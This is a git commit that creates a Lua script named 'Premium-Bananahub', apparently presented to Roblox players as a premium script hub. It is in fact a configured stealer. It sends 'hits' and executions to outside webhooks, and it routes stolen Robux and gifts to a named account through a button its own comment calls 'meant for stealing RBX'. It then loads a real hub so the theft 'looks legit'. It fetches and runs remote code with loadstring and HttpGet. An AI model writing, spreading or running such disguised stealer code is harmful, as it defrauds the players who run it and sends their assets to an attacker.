ab3cf64e2ea3b81a43b4daebd3b894687dcfbf31
Fullmoon-hub <gokhaniiigokhani@gmail.com>
2025-03-08 12:26:01 +0400

    Create Premium-Bananahub.lua

---
+++ Premium-Bananahub.lua
@@ -0,0 +1,8 @@
+LogsWebhook = "https://webhook-protect.vercel.app/api/webhook?id=Y2tkN29YOTNYSmxKcHhMakIwRk5mZzpXeTNEM1ZIazd0QndUU1liUHBOUlktUWxOYXFoMHlYTDU4bFVqenRwOGw0QlFDS0VUV1RydHRKTXhsX1JKSE1RQTZ5UHZXSXg5T3lzTGNIS0QxTWFpZUdRWHFKeG1oTTM5R2RkR0dPbHUxNE02NjQyUUhoQ2lrRlJwQndvczR1X1p6Y3F3RDc0b1k5d1haVGwwN1NvN19PQTl0dnNtbVh5dmtXaXU3Y3FldEk" -- << Webhook for logging hits >>
+ExecutionWebhook = "https://webhook-protect.vercel.app/api/webhook?id=THRoYUM5UWRJMFRiOHBWR25wWHNkZzo2bFJHN0NEdVBKVUt1ekdCVmRELXE3cmVYU1M5Rk5DV09nMnBIN2E3RVVycWdkdGZSbVlJbV8tWVNxczVHNEdLSXZ6Qnl6TmNkeEdWZjRmTW5BTVlKTXIxTzVhT2RBMWxxeE1NNEp4blpzRGNSUDc2MExiNWhoLXlmWW5VSmx6eDBUT3JEUTQwLTgtZzRBSEl1YzkxUy1uZFktMXp2YndLTC1RdF9JNzkwOGc" -- << Webhook for logging executions >>
+Username = "im_kiddd8" -- << Username of the account where gifts will be sent >>
+PromptText = "Launch Script." -- << Text of the button meant for stealing RBX >>
+RandomizedPrompt = true -- << Makes the prompt have a unique design each execution >>
+LoadRedzAfterHit = true -- << Loads redz hub after you get a hit, so looks legit >>
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))()
